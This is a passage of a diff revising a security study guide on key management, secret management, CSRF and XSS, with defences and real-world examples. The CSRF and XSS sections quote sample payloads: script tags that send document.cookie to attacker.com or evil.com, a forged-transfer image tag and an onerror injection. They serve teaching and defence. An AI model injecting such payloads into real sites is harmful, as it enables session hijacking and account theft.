-- Auditability
-- Compliance support
-- Fine-grained access control
-- Reduced operational complexity
-
-### Common security practices
-
-- Never hardcode keys
-- Rotate keys regularly
-- Use envelope encryption
-- Restrict key access
-- Enable audit logging
-- Use HSM-backed keys
-- Apply least privilege access
-- Separate keys by application/domain
-
-### High-level KMS architecture
-
-```text
-Application → KMS → Key Policies + Audit Logs → CMKs → HSM/Secure Key Storage
-```
-
-### Summary
-
-```text
-KMS = centralized create, store, rotate, and control cryptographic keys
-Use envelope encryption: DEK for data, CMK protects DEK via KMS
-Never hardcode keys; enforce policies, audit logs, rotation, and least privilege
-```
+Technically, KMS exposes APIs for **encrypt**, **decrypt**, **generate data key**, and **sign** while key material stays in hardware-backed or HSM-protected storage. Applications use **envelope encryption**: encrypt data with a short-lived **DEK** (data encryption key), then ask KMS to encrypt the DEK with a **CMK** (customer master key).
 
 ---
 
-## 10.12 Secret Management
+### What problem it fixes
 
-### What is secret management?
-
-**Secret management** is the process of securely storing, accessing, rotating, and controlling sensitive credentials used by applications and services.
-
-**Examples of secrets:**
-
-- Database passwords
-- API keys
-- OAuth client secrets
-- JWT signing keys
-- Encryption keys
-- Certificates
-- SSH keys
-- Third-party credentials
-
-**Purpose:** prevent sensitive information from being exposed to unauthorized users or systems.
-
-### Why secret management?
-
-**Bad practice:**
+**Bad pattern:**
 
 ```text
-Application → hardcoded password
-
-Example: db.password=admin123
+const ENCRYPTION_KEY = "hardcoded-secret-in-repo"
 ```
 
-**Problems:** source code exposure · difficult rotation · security risks · credential leakage
+Problems: key in Git history, same key everywhere, no rotation, no audit of who decrypted what, instant full breach if leaked.
 
-**Better approach:**
+KMS centralizes:
+
+- **Secure generation** — cryptographically strong random keys.
+- **Access control** — IAM policies on which service may decrypt which CMK.
+- **Audit trail** — CloudTrail or equivalent logs every key use.
+- **Rotation** — new key versions without application redeploy for data re-encryption strategies.
+
+Encryption is only as strong as key handling — KMS addresses the weakest link.
+
+---
+
+### What it does
+
+KMS manages the **key lifecycle**:
 
 ```text
-Application → secret manager → retrieve secret securely
+Create → store → use (encrypt/decrypt) → rotate → disable → delete (with waiting period)
 ```
 
-**Benefits:**
+Responsibilities:
 
-- Centralized management
-- Better security
-- Easier rotation
-- Auditing support
+| Operation | Purpose |
+|-----------|---------|
+| **GenerateDataKey** | Produce DEK; return plaintext + ciphertext of DEK |
+| **Encrypt / Decrypt** | Wrap small payloads (secrets, DEKs) under CMK |
+| **Rotate** | New CMK version; old decrypts legacy data |
+| **Policy** | Who may call which APIs on which keys |
+| **Audit** | Log principal, time, operation |
 
-### What is a secret?
+Applications call KMS APIs; they do not read raw CMK bytes.
 
-A secret is any sensitive piece of information used for authentication, authorization, or encryption.
+---
 
-**Examples:** database password · API key · private key · OAuth client secret · JWT secret · certificate
+### How it works — the architecture inside
 
-### Secret management goals
+#### CMK and DEK
 
-- Secure storage
-- Controlled access
-- Secret rotation
-- Auditability
-- High availability
-- Least privilege access
-- Compliance support
+| Key | Role |
+|-----|------|
+| **CMK** | Long-lived master key in KMS; encrypts DEKs |
+| **DEK** | Per-object or per-session key; encrypts actual data |
 
-### High-level architecture
+#### Envelope encryption flow
 
-```text
-Application → Secret Manager → Secret Store
-```
-
-### Secret storage
-
-**Never store secrets in:**
-
-- Source code
-- Git repositories
-- Configuration files
-- Shared documents
-
-**Store secrets in:**
-
-- Secret manager
-- Secure vault
-- Encrypted secret store
-
-### Secret retrieval flow
+**Write:**
 
 ```text
-Application startup → authenticate → request secret → secret manager → return secret → application uses secret
-```
-
-### Static secrets
-
-Long-lived credentials.
-
-**Examples:** database password · API key · SMTP password
-
-**Characteristics:** manually managed · long expiration period · higher compromise risk
-
-### Dynamic secrets
-
-Secrets generated on demand.
-
-```text
-Application → request database credential → secret manager → temporary credential
-```
-
-**Characteristics:** short-lived · automatically expired · more secure
-
-### Secret lease
-
-Dynamic secrets usually have a lease.
-
-```text
-Database credential — valid for 1 hour
-After expiration → credential becomes invalid
-```
-
-### Secret rotation
-
-Periodic replacement of secrets.
-
-```text
-Old secret → new secret → applications updated
-```
-
-**Benefits:** reduces exposure window · improves security
-
-### Automatic secret rotation
-
-Secret manager rotates credentials automatically.
-
-```text
-Database password: old password → new password → application retrieves updated secret
-```
-
-### Access control
-
-Not every application should access every secret.
-
-```text
-Order service   → order database secret
-Payment service → payment database secret
-```
-
-**Benefits:** better isolation · reduced blast radius
-
-### Least privilege principle
-
-Applications receive only the secrets they actually need.
-
-```text
-Inventory service
-  Can access:    inventory-db-password
-  Cannot access: payment-db-password
-```
-
-### Secret versioning
-
-A secret may have multiple versions.
-
-```text
-db-password
-  Version 1
-  Version 2
-  Version 3
-```
-
-Allows safe rotation and rollback.
-
-### Audit logging
-
-Every secret operation should be logged.
-
-**Examples:**
-
-- Who accessed secret?
-- When accessed?
-- Which application?
-
-**Operations:** read · create · update · delete
-
-### Secret encryption
-
-Secrets themselves are stored encrypted.
-
-**Store:**
-
-```text
-Secret → encrypt → store
+1. App calls KMS GenerateDataKey → plaintext_DEK + encrypted_DEK
+2. App encrypts file with plaintext_DEK (AES locally)
+3. App stores encrypted_file + encrypted_DEK; discards plaintext_DEK from memory
+4. KMS never sees the full file — only key operations
 ```
 
 **Read:**
 
 ```text
-Read secret → decrypt → return to authorized user
+1. App loads encrypted_file + encrypted_DEK
+2. App calls KMS Decrypt(encrypted_DEK) → plaintext_DEK
+3. App decrypts file locally
+4. Discard plaintext_DEK after use
 ```
-
-### Secret management vs KMS
-
-| | KMS | Secret Manager |
-|---|-----|----------------|
-| **Manages** | Encryption keys | Credentials and secrets |
-| **Examples** | Master keys, data encryption keys | Passwords, API keys, certificates, tokens |
-
-KMS protects **keys**. Secret manager protects **credentials**.
-
-### Secret management in microservices
 
 ```text
-Secret Manager → Order Svc + Payment Svc + User Svc (authorized secrets only)
+Benefits: bulk crypto local and fast; master key never leaves KMS; CMK rotation re-wraps DEKs
 ```
 
-Each service retrieves only its authorized secrets.
-
-### Database password management
-
-**Bad:**
+#### Key rotation and versioning
 
 ```text
-application.yml → db.password=admin123
+CMK version 1 → encrypts DEKs until rotation
+CMK version 2 → new encryptions
+Old data: decrypt DEK with version 1 — still works
 ```
 
-**Good:**
+Automatic rotation (e.g. annual) limits blast radius of compromise.
+
+#### Access control
 
 ```text
-Application → secret manager → database password
+Policy on payment-key:
+  Allow decrypt: payment-service role
+  Deny decrypt:   analytics-service role
 ```
 
-Password never stored in source code.
+**Least privilege** — separate CMKs per domain (payments, PII, logs).
 
-### API key management
+#### HSM backing
+
+Cloud KMS often stores key material in **Hardware Security Modules** — tamper-resistant devices that prevent key export. FIPS 140-2 Level 3 HSMs are common in regulated workloads.
+
+```mermaid
+flowchart LR
+    App[Application] --> GenDEK[KMS GenerateDataKey]
+    GenDEK --> DEK[Plaintext DEK in memory]
+    DEK --> EncData[Encrypt data locally]
+    EncData --> Store[(Store ciphertext + encrypted DEK)]
+    GenDEK --> EncDEK[Encrypted DEK from KMS]
+    EncDEK --> Store
+    Read[Read path] --> Store
+    Read --> DecDEK[KMS Decrypt encrypted DEK]
+    DecDEK --> DEK2[Plaintext DEK]
+    DEK2 --> DecData[Decrypt data locally]
+```
+
+---
+
+### Pitfalls and design tips
+
+- **Never log plaintext DEKs or CMKs** — log key IDs only.
+- **Use envelope encryption for large blobs** — do not send megabytes through KMS encrypt API (size limits and cost).
+- **Separate keys per tenant or data class** — one compromised CMK does not decrypt everything.
+- **Deletion waiting period** — scheduled key deletion is irreversible; ciphertext becomes permanent noise.
+- **Cache DEKs briefly** — reduce KMS calls but limit exposure window in memory.
+- **Cloud services:** AWS KMS, Google Cloud KMS, Azure Key Vault, HashiCorp Vault — same mental model.
+- **Pair with encryption at rest (10.9)** — KMS is how keys are managed; SSE-KMS, RDS encryption, and TDE integrate with KMS.
+
+---
+
+### Real-world example
+
+**AWS KMS envelope encryption for application-level PII**
+
+1. Customer service uploads a support ticket with SSN; app calls `kms:GenerateDataKey` on CMK `alias/pii-key`.
+2. KMS returns `Plaintext` (32-byte DEK) and `CiphertextBlob` (DEK encrypted under CMK).
+3. App encrypts SSN with AES-256-GCM using plaintext DEK; stores `{ encrypted_ssn, encrypted_dek }` in DynamoDB.
+4. Plaintext DEK zeroed from memory after write.
+5. Agent views ticket — app loads row, calls `kms:Decrypt` on `encrypted_dek` (IAM allows `support-service` role only).
+6. KMS logs decrypt in CloudTrail; app decrypts SSN in memory for display over HTTPS.
+
+AWS KMS `GenerateDataKey` API documentation describes this exact envelope pattern used with RDS, S3, and custom application encryption.
+
+## 10.12 Secret Management
+
+### Overview
+
+Picture a hotel where every employee carries a master key taped to their badge and the spare is written on a whiteboard in the lobby. Anyone who photographs the board or copies a badge can walk into any room. Secret management is the opposite: one vault, named keys per door, a log of who borrowed what, and keys that expire or change on a schedule.
+
+Technically, **secret management** is the lifecycle control of sensitive credentials — database passwords, API keys, TLS private keys, OAuth client secrets, JWT signing keys — through centralized storage, encrypted at rest, with access policies, versioning, rotation, and audit trails. Applications authenticate to a secret manager at runtime rather than reading credentials from source code or config files.
+
+---
+
+### What problem it fixes
+
+Hardcoded or flat-file secrets create predictable failure modes:
+
+- **Source code exposure** — a leaked repo or backup reveals `db.password=admin123` forever.
+- **Rotation pain** — changing a password means redeploying every service that embeds it.
+- **No accountability** — you cannot answer who read which credential and when.
+- **Blast radius** — one compromised service file may contain keys for every downstream system.
+
+Secret management moves credentials out of code into a dedicated store where access is scoped, logged, and revocable.
+
+---
+
+### What it does
+
+A secret manager provides:
+
+| Capability | What it means in practice |
+|------------|---------------------------|
+| **Secure storage** | Secrets encrypted at rest; often backed by a KMS or HSM for master keys |
+| **Controlled retrieval** | Only authenticated workloads receive secrets they are authorized to read |
+| **Static secrets** | Long-lived passwords and API keys with versioning for safe rotation |
+| **Dynamic secrets** | Short-lived credentials generated on demand (e.g. one-hour DB user) |
+| **Leases** | Automatic expiry on dynamic credentials — invalid after TTL |
+| **Rotation** | Periodic or automatic replacement; apps pull the latest version |
+| **Audit logging** | Every read, create, update, and delete is recorded |
+
+Secret management is **not** the same as KMS: KMS protects **encryption keys**; a secret manager protects **credentials** (passwords, tokens, certificates). They often work together — the secret store encrypts payloads with KMS.
+
+---
+
+### How it works — the architecture inside
+
+**Retrieval flow at application startup:**
 
 ```text
-Application → secret manager → retrieve API key → call external service
+Application → authenticate (IAM role, K8s SA, mTLS) → request secret by name
+  → policy engine checks identity + path → decrypt from encrypted store → return secret
+  → application opens DB connection / signs JWT / calls external API
 ```
 
-Keys remain centrally controlled.
-
-### Certificate management
-
-Secret managers often store:
-
-- TLS certificates
-- Private keys
-- Client certificates
-
-**Benefits:** centralized storage · controlled access · easier rotation
-
-### Containerized applications
+**Static vs dynamic secrets:**
 
 ```text
-Container → authenticate → fetch secret → run application
+Static:   app requests "prod/db-password" → manager returns current version (v3)
+Dynamic:  app requests "database/creds/orders" → manager creates temp user + password
+          → returns credential with 1-hour lease → credential revoked at expiry
 ```
 
-Secrets should not be baked into docker images, container filesystems, or source code.
-
-### Kubernetes and secrets
+**Rotation with versioning:**
 
 ```text
-Application pod → request secret → secret management system → retrieve secret
+db-password
+  v1 (deprecated)  v2 (active)  v3 (staging)
+Apps poll or receive push notification → switch to v3 → v1 disabled after grace period
 ```
 
-Secrets often injected at runtime.
-
-**Benefits:** better security · easier updates
-
-### Common security practices
-
-- Never hardcode secrets
-- Rotate secrets regularly
-- Use dynamic secrets when possible
-- Enable audit logging
-- Encrypt secrets at rest
-- Use TLS for secret retrieval
-- Apply least privilege access
-- Monitor secret usage
-
-### Common challenges
-
-- Secret sprawl
-- Manual rotation
-- Access control complexity
-- Credential leakage
-- Audit requirements
-- Multi-environment management
-
-### High-level secret management architecture
+**Least privilege in microservices:**
 
 ```text
-Applications → Secret Manager → Access Policy + Audit Logs → Encrypted Secret Store → KMS/HSM
+Order service   → order-db-password only
+Payment service → payment-db-password only
+Inventory service → inventory-db-password only (cannot read payment secret)
 ```
 
-### Summary
-
-```text
-Secret management = secure store, access, rotate, and audit credentials
-Never hardcode; use secret manager with dynamic secrets and leases when possible
-Separate from KMS (keys vs credentials); least privilege, versioning, and audit logs
+```mermaid
+flowchart LR
+    App[Application pod] --> Auth[Authenticate workload]
+    Auth --> SM[Secret Manager]
+    SM --> Policy[Access policy]
+    Policy --> Store[Encrypted secret store]
+    Store --> KMS[KMS / HSM]
+    SM --> Audit[Audit log]
+    SM --> App
 ```
+
+**Containers and Kubernetes:** secrets are fetched at runtime via sidecar, CSI driver, or init container — never baked into image layers. Native `Secret` objects are base64-encoded, not encrypted by default; production systems usually integrate with Vault, AWS Secrets Manager, or GCP Secret Manager rather than storing plaintext equivalents in etcd.
+
+---
+
+### Pitfalls and design tips
+
+- **Never** commit secrets to Git, Dockerfiles, Helm values in plain text, or shared docs — use references (`secretRef`) only.
+- Prefer **dynamic secrets** for databases when the manager supports them; static passwords need disciplined rotation calendars.
+- **Version pinning** during rotation: allow both old and new versions briefly so rolling deploys do not fail mid-cutover.
+- Distinguish **secret manager vs KMS vs config server** — Config Server holds non-sensitive toggles; KMS holds DEKs/CMKs; secret manager holds credentials.
+- Watch **secret sprawl** — hundreds of orphaned API keys; enforce naming conventions and ownership tags.
+- Enable **TLS** on all secret retrieval APIs; cache secrets in memory with short TTL, not on disk.
+- Interview angle: "How do you rotate DB passwords without downtime?" → dual-version support, staggered app restarts, or dynamic credentials with connection pool refresh.
+
+---
+
+### Real-world example
+
+**AWS Secrets Manager + RDS:** An ECS task starts with an IAM task role that allows `secretsmanager:GetSecretValue` on `arn:...:secret:prod/orders-db-*` only. At boot, the task pulls the JSON secret `{"username":"orders_app","password":"..."}`, opens a connection pool, and never stores the password in the image. When ops triggers rotation, Secrets Manager creates a new password in RDS, updates secret version, and optionally invokes a Lambda to notify services. CloudTrail records every `GetSecretValue` with principal, time, and source IP — satisfying audit questions after a suspected credential leak.
 
 ---
 
 ## 10.13 CSRF
 
-Common web application attacks and where defenses sit:
+### Overview
+
+Imagine you sign into your bank, then open a gossip blog. Unseen, the blog page contains a hidden form that submits a transfer from your account. Your browser helpfully attaches your bank session cookie because it thinks you are still "logged in" to the bank. **CSRF (Cross-Site Request Forgery)** is that trick: the attacker never steals your password; they abuse the browser's habit of sending your credentials automatically.
+
+Technically, CSRF is a web vulnerability where a victim's browser performs an authenticated, **state-changing** request to a site where the victim is already logged in. The server trusts the session cookie and executes the action — transfer funds, change email, delete account — even though the user did not intend it from the attacker's page.
+
+---
+
+### What problem it fixes
+
+Browsers automatically include cookies (and sometimes ambient auth) on cross-origin requests. Servers historically assumed: valid session cookie → legitimate user intent. That assumption breaks when any other site can cause the browser to **POST**, **PUT**, or **DELETE** to your API while the user is authenticated.
+
+CSRF defenses restore the guarantee that state-changing requests carry proof they originated from **your** application's UI, not a third-party page.
+
+---
+
+### What it does
+
+Protection mechanisms ensure forged cross-site requests fail:
+
+| Defense | Mechanism |
+|---------|-----------|
+| **CSRF token** | Unpredictable token in form/header; server validates on each unsafe request |
+| **SameSite cookies** | Limits when cookies ride along on cross-site navigation or subrequests |
+| **Origin / Referer check** | Server rejects requests whose `Origin` or `Referer` is not the trusted site |
+| **Double-submit cookie** | Token in cookie must match token in header/body |
+| **Re-authentication** | Password or OTP again for high-impact actions |
+
+Safe methods (**GET**, **HEAD**) should not change server state; CSRF targets **unsafe** methods that mutate data.
+
+---
+
+### How it works — the architecture inside
+
+**Attack without protection:**
 
 ```text
-CSRF → CSRF token / SameSite · XSS → encoding / CSP / HttpOnly · SQLi → parameterized queries / WAF · SSRF → URL allowlist · Clickjacking → X-Frame-Options / CSP frame-ancestors
+1. User logs into bank.com → session cookie stored
+2. User visits evil.com
+3. evil.com: <img src="https://bank.com/transfer?to=attacker&amount=10000"> or auto-submit POST form
+4. Browser sends bank.com cookie with the request
+5. Bank executes transfer — server sees valid session
 ```
 
-### What is CSRF?
-
-**CSRF (Cross-Site Request Forgery)** is a web security vulnerability where an attacker tricks a logged-in user into performing unwanted actions on a trusted application.
-
-**Key idea:** the browser automatically sends credentials, so the attacker abuses that trust.
-
-### How CSRF happens
-
-CSRF works because browsers automatically attach credentials like:
-
-- Cookies
-- Session IDs
-- Stored authentication tokens (in some cases)
-
-**Attack flow:**
+**Defense with CSRF token:**
 
 ```text
-Step 1: User logs into banking website
-Step 2: Browser stores session cookie
-Step 3: User visits attacker website
-Step 4: Attacker triggers request to bank
-Step 5: Browser automatically sends cookie
-Step 6: Bank executes action thinking it's valid user
+1. User loads bank.com/transfer form
+2. Server embeds CSRF token in page + sets cookie (optional double-submit)
+3. Legitimate POST includes X-CSRF-Token header matching server-side session store
+4. evil.com cannot read bank.com token (same-origin policy) → forged POST lacks token → 403
 ```
 
-### Example scenario
+**SameSite behavior:**
 
-**Banking website:**
+| Value | Cross-site POST cookie sent? |
+|-------|------------------------------|
+| `Strict` | No — strongest; may break some legitimate deep links |
+| `Lax` | Only on top-level safe navigations (default in modern browsers) |
+| `None` | Yes — requires `Secure`; use only when cross-site cookies are required |
 
-```http
-POST /transfer
-{
-  "to": "attacker_account",
-  "amount": 10000
-}
+```mermaid
+flowchart LR
+    User[Logged-in user] --> Evil[Attacker site]
+    Evil --> Forge[Forged POST to bank]
+    Forge --> Browser[Browser adds session cookie]
+    Browser --> Bank[Bank API]
+    Bank --> Check{CSRF token valid?}
+    Check -->|No| Reject[403 Reject]
+    Check -->|Yes| Execute[Execute action]
 ```
 
-User is already logged in. Attacker page contains:
+**Auth model and CSRF risk:**
 
-```html
-<img src="https://bank.com/transfer?amount=10000&to=attacker" />
-```
+| Auth style | CSRF risk |
+|------------|-----------|
+| Session cookie | High — cookie sent automatically |
+| JWT in `Authorization` header (SPA) | Low — attacker page cannot set custom headers on cross-origin requests without CORS |
+| JWT in cookie | High again — same as session cookies |
 
-Browser automatically sends session cookie.
+CSRF primarily affects **browser-based, cookie-session** apps. Service-to-service calls with API keys or mTLS are not CSRF targets.
 
-**Result:** money transfer happens without user intent.
+---
 
-### Why CSRF works
+### Pitfalls and design tips
 
-Because of:
+- CSRF tokens must be **per-session or per-request**, unpredictable, and validated server-side — not only on login.
+- `SameSite=Lax` helps but is not a solo fix for all flows (e.g. POST from embedded contexts).
+- **Origin checks** can fail when proxies strip headers; treat missing `Origin` on POST carefully.
+- Do not use **GET for state changes** — bookmarked or `<img>`-triggered URLs become exploit gadgets.
+- Pair CSRF defense with **HTTPS** everywhere; tokens in cleartext HTTP are stealable via network attackers.
+- If you move auth to `localStorage` + Bearer token, CSRF drops but **XSS becomes the critical risk** — design holistically.
+- Frameworks (Django, Rails, Spring Security) ship CSRF middleware; disabling it for "API convenience" on cookie-auth endpoints is a common mistake.
 
-- Automatic cookie inclusion by browsers
-- Trust between browser and server
-- No request origin validation
+---
 
-Server assumes: if cookie is valid → request is valid.
+### Real-world example
 
-### Impact of CSRF
-
-CSRF can cause:
-
-- Unauthorized transactions
-- Profile changes
-- Password changes
-- Email updates
-- Account deletion
-
-Severity depends on application type.
-
-### CSRF vs XSS
-
-| | CSRF | XSS |
-|---|------|-----|
-| **Mechanism** | Tricks user browser | Injects malicious script |
-| **Uses** | User identity | Runs inside victim browser |
-| **Effect** | Executes unwanted actions | Steals data or session |
-| **Trust abused** | Authentication trust | Application code trust |
-
-### CSRF attack requirements
-
-CSRF works only if:
-
-- User is authenticated
-- Cookies are automatically sent
-- No CSRF protection exists
-- Action changes state (POST/PUT/DELETE)
-
-### Safe vs unsafe requests
-
-| Safe requests | Unsafe requests |
-|---------------|-----------------|
-| GET (should not change data) | POST · PUT · DELETE |
-
-CSRF mainly targets **unsafe requests**.
-
-### CSRF protection methods
-
-Main protection strategies:
-
-- CSRF tokens
-- SameSite cookies
-- Referer/Origin validation
-- Double submit cookies
-- Re-authentication for sensitive actions
-
-### CSRF token (most common method)
-
-Each request includes a unique token.
-
-```text
-User loads page → server generates CSRF token → token in form/header → request with token → server validates → allow or reject
-```
-
-**Example:**
-
-```http
-POST /transfer
-X-CSRF-Token: a8d92k...
-```
-
-If token missing or invalid → request rejected.
-
-### Why CSRF tokens work
-
-Attacker website cannot access:
-
-- CSRF token from server page
-- Secure browser storage (same-origin policy)
-
-So the attacker cannot forge a valid request.
-
-### SameSite cookies
-
-Cookie attribute: `SameSite`
-
-| Value | Behavior |
-|-------|----------|
-| **Strict** | Cookie not sent in cross-site requests |
-| **Lax** | Cookie sent only for safe top-level navigation |
-| **None** | Cookie sent in all contexts (must use `Secure`) |
-
-### Referer / Origin check
-
-Server checks request source.
-
-```http
-Referer: https://trusted-site.com
-```
-
-If mismatch → reject request.
-
-**Limitations:** can be missing · can be modified in some cases
-
-### Double submit cookie
-
-CSRF token stored in two places:
-
-- Cookie
-- Request parameter/header
-
-```text
-Server verifies: cookie token == request token
-If mismatch → reject
-```
-
-### Re-authentication
-
-For sensitive actions:
-
-- Password required again
-- OTP verification
-
-**Examples:** delete account · transfer funds
-
-Adds an extra security layer.
-
-### CSRF in modern apps
-
-CSRF risk depends on authentication type:
-
-| Auth type | CSRF risk |
-|-----------|-----------|
-| **Session cookies** | High — CSRF possible |
-| **JWT in local storage** | Lower CSRF risk (but XSS risk) |
-| **JWT in cookies** | CSRF risk still exists |
-
-### Microservices and CSRF
-
-CSRF mainly affects:
-
-- Browser-based clients
-- Session-based authentication systems
-
-Not typically an issue for:
-
-- Service-to-service calls
-- Backend APIs using API keys or mTLS
-
-### High-level architecture
-
-**Without protection:**
-
-```text
-User browser → malicious site → forged request → bank website → session cookie attached → server executes request
-```
-
-**With CSRF protection:**
-
-```text
-Browser → request includes CSRF token → server validates token → reject if invalid
-```
-
-### Best practices
-
-- Use CSRF tokens
-- Enable SameSite cookies
-- Validate Origin/Referer headers
-- Avoid state-changing GET requests
-- Use HTTPS
-- Require re-auth for sensitive actions
-- Short session lifetime
-
-### Summary
-
-```text
-CSRF = attacker tricks logged-in browser into unwanted state-changing requests
-Protect with CSRF tokens, SameSite cookies, Origin checks, and re-auth for sensitive actions
-Main risk with session cookies; less risk with JWT in localStorage (but XSS becomes the concern)
-```
+A classic **bank transfer CSRF** (responsible disclosure patterns in OWASP training): the transfer endpoint accepts `POST /transfer` with body `to=attacker&amount=10000`. An attacker hosts a page with a hidden form targeting that URL. A logged-in victim visiting the page triggers submission; the browser attaches the `JSESSIONID` cookie. With **Spring Security CSRF** enabled, the form must include `_csrf` token from the server-rendered page — the attacker's site cannot obtain it, so the request is rejected with 403. SameSite=Lax provides an additional layer by withholding the cookie on cross-site POST from evil.com in supporting browsers.
 
 ---
 
 ## 10.14 XSS
 
-### What is XSS?
+### Overview
 
-**XSS (Cross-Site Scripting)** is a web security vulnerability where an attacker injects malicious scripts into a trusted website, which then executes in the user's browser.
+A comment box on a trusted news site is like a guest writing on the lobby whiteboard — except an attacker writes instructions the building's staff robot will obey literally. **XSS (Cross-Site Scripting)** is when user-supplied text is treated as code: the victim's browser runs the attacker's JavaScript in the context of your site, with access to that site's cookies, DOM, and APIs.
 
-**Key idea:** attacker injects code → browser executes it as part of the trusted website.
+Technically, XSS occurs when untrusted input is stored, reflected, or processed into the DOM without proper encoding or isolation, so `<script>` or event-handler payloads execute as first-party code. The browser cannot distinguish attacker script from your own bundle.
 
-### Why XSS happens
+---
 
-XSS happens when:
+### What problem it fixes
 
-- User input is not properly validated
-- User input is directly rendered in HTML
-- Output encoding is missing
-- JavaScript execution context is unsafe
+Web pages mix **data** and **code** (HTML, JavaScript, CSS). When user input lands in the wrong context — inside HTML, inside a script block, inside a URL — special characters change meaning from "text to display" to "instructions to run." XSS fixes the boundary: untrusted strings must be encoded for their sink context or kept out of executable paths entirely.
 
-**Example:** server stores or reflects `<script>...</script>` and the browser executes it.
+---
 
-### Impact of XSS
+### What it does
 
-XSS can lead to:
+Defenses layer from input to browser enforcement:
 
-- Session cookie theft
-- Account hijacking
-- Credential stealing
-- Unauthorized actions on behalf of user
-- Defacement of websites
-- Phishing attacks
+| Layer | Action |
+|-------|--------|
+| **Output encoding** | Escape `<`, `>`, `"`, `'` for HTML context so `<script>` renders as text |
+| **Input validation** | Reject or normalize unexpected formats (length, charset, allowlists) |
+| **Sanitization** | For rich text, strip dangerous tags/attributes with a vetted library (DOMPurify) |
+| **CSP** | `Content-Security-Policy` restricts which scripts may run — blocks inline injection |
+| **HttpOnly cookies** | `document.cookie` cannot read session ID — limits session theft after XSS |
+| **Safe APIs** | `textContent` instead of `innerHTML`; avoid `eval`, `document.write` |
 
-Severity depends on context and data exposure.
+Three XSS variants differ by where payload lives:
 
-### How XSS works
+| Type | Where payload lives | Who is affected |
+|------|---------------------|-----------------|
+| **Stored** | Database (comments, profiles) | Every viewer of the page |
+| **Reflected** | URL/query echoed in response | Victim who clicks crafted link |
+| **DOM-based** | Client-side JS writes input to DOM | Victim; server may never see payload |
 
-**Attack flow:**
+---
 
-```text
-Step 1: Attacker injects malicious script
-Step 2: Server stores or reflects it
-Step 3: Victim loads page
-Step 4: Browser executes script
-Step 5: Script performs malicious actions
-```
+### How it works — the architecture inside
 
-### Example of stored XSS
-
-**Comment system** — user submits comment:
-
-```html
-<script>
-  fetch("https://attacker.com/steal?cookie=" + document.cookie)
-</script>
-```
-
-Server stores it in database. When other users open the page, the browser executes the script.
-
-**Result:** cookies or session data stolen.
-
-### Reflected XSS
-
-Malicious script is reflected immediately from request to response.
-
-**Example URL:**
+**Stored XSS attack flow:**
 
 ```text
-https://site.com/search?q=<script>alert(1)</script>
+Attacker posts comment: <script>fetch('https://evil.com/?c='+document.cookie)</script>
+Server stores raw HTML in DB → page renders comment unescaped → victim loads page
+Browser executes script as news.com origin → session exfiltrated if not HttpOnly
 ```
 
-**Server response:**
+**Reflected XSS:**
 
 ```text
-Search results for: <script>alert(1)</script>
+GET /search?q=<script>alert(1)</script>
+Response: Results for: <script>alert(1)</script>  (unescaped)
+Victim clicks link → immediate execution
 ```
 
-Browser executes script instantly.
-
-### DOM-based XSS
-
-Occurs entirely in the browser.
-
-```text
-User input → JavaScript processes input → unsafe DOM update → script execution
-```
-
-**Example:**
+**DOM-based XSS:**
 
 ```javascript
-document.innerHTML = userInput
+// Vulnerable pattern
+document.getElementById('out').innerHTML = location.hash.slice(1);
+// Attacker URL: https://app.com/#<img src=x onerror=steal()>
 ```
 
-If `userInput` contains script → executed.
-
-### Types of XSS
-
-| Type | Description |
-|------|-------------|
-| **Stored XSS** | Stored in database; affects multiple users |
-| **Reflected XSS** | Comes from request; immediate execution |
-| **DOM-based XSS** | Happens in browser; no server involvement |
-
-### How XSS executes
-
-Browsers treat HTML + JavaScript as trusted when coming from the same origin.
-
-If attacker injects:
-
-```html
-<script>alert('Hacked')</script>
-```
-
-Browser executes it as part of the page.
-
-### Cookie theft via XSS
-
-```html
-<script>
-fetch("https://evil.com/steal?cookie=" + document.cookie)
-</script>
-```
-
-If cookies are not HttpOnly:
-
-- Session cookie is exposed
-- Attacker can hijack session
-
-### XSS vs CSRF
-
-| | XSS | CSRF |
-|---|-----|------|
-| **Mechanism** | Injects and executes script | Tricks browser into sending requests |
-| **Runs** | Inside victim browser | Does not execute script in site context |
-| **Effect** | Steals data or performs actions | Forged request using browser trust |
-
-**Difference:** XSS → code execution in browser · CSRF → forged request using browser trust
-
-### XSS prevention techniques
-
-- Input validation
-- Output encoding
-- Content Security Policy (CSP)
-- HttpOnly cookies
-- Sanitization
-- Avoid `innerHTML` usage
-- Use safe templating engines
-
-### Output encoding
-
-Convert special characters:
+**Defense pipeline:**
 
 ```text
-< → &lt;
-> → &gt;
-" → &quot;
+User input → validate format → sanitize (if rich HTML) → store
+On render → context-aware encode (HTML, attr, JS, URL) → CSP header on response
+Session cookie: HttpOnly; Secure; SameSite
 ```
 
-**Example:**
-
-```text
-Input:  <script>
-Output: &lt;script&gt;
+```mermaid
+flowchart LR
+    Input[User input] --> Validate[Validation]
+    Validate --> Sanitize[Sanitize / encode]
+    Sanitize --> Store[Database]
+    Store --> Render[Template render]
+    Render --> CSP[CSP enforcement]
+    CSP --> Browser[Browser]
 ```
 
-Prevents execution.
+**Cookie theft mitigation:** `Set-Cookie: SESSION=abc; HttpOnly; Secure` — even if XSS runs, `document.cookie` cannot read the session. CSP `script-src 'self'` blocks inline attacker scripts unless nonce/hash policy is misconfigured.
 
-### Input sanitization
+Modern frameworks (React, Vue, Angular) escape text interpolations by default; risk returns with `dangerouslySetInnerHTML`, raw HTML pipes, and server-side templates that disable auto-escape.
 
-Remove or neutralize malicious content.
+---
 
-**Examples:** strip `<script>` tags · allow only safe HTML tags
+### Pitfalls and design tips
 
-Used in comment systems, blogs, etc.
+- Encode for **context** — HTML encoding is wrong for JavaScript or URL sinks; use framework escapers per context.
+- **CSP** with `'unsafe-inline'` or broad `script-src *` weakens the main XSS backstop.
+- Sanitization libraries must be **allowlist-based**; regex strip of `<script>` is bypassable (`<img onerror=...>`).
+- DOM XSS in single-page apps is common in `innerHTML`, `eval`, `location.href = userInput`, and postMessage handlers without origin checks.
+- Stored XSS in **admin panels** (user-generated report names, log fields) is high impact — attackers target operators.
+- WAF XSS rules are a safety net, not a substitute for encoding at the template layer.
+- Interview: distinguish **XSS (code in your origin)** from **CSRF (forged requests with cookies)** — XSS can steal tokens; CSRF abuses cookies without running code on your domain.
 
-### Content Security Policy (CSP)
+---
 
-Browser security layer.
+### Real-world example
 
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self';
-```
-
-**Benefits:**
-
-- Blocks inline scripts
-- Restricts external scripts
-- Reduces XSS impact
-
-### HttpOnly cookies
-
-Prevents JavaScript access to cookies.
-
-```http
-Set-Cookie: SESSIONID=abc123; HttpOnly
-```
-
-**Result:** `document.cookie` cannot read session — reduces cookie theft risk.
-
-### Secure coding practices
-
-**Avoid:**
-
